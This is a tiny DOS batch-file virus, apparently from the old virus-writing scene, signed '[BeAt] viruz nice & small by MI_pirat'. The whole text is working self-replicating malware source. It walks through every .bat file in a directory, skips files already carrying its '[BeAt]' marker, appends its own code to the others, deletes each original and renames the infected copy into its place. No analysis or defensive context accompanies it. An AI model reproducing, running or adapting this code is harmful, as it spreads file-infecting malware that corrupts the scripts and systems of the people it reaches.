@:: [BeAt] viruz nice & small by MI_pirat
@if exist %1\nul goto scr
@find /i "[BeAt]" <%1>nul
@if not errorlevel 1 goto end
@goto xxx
:scr 
for %%a in (*.bat) do Call %0 %%a
:xxx
@copy /a %1 + %0 c.c
@erase %1
@rename c.c %1
:end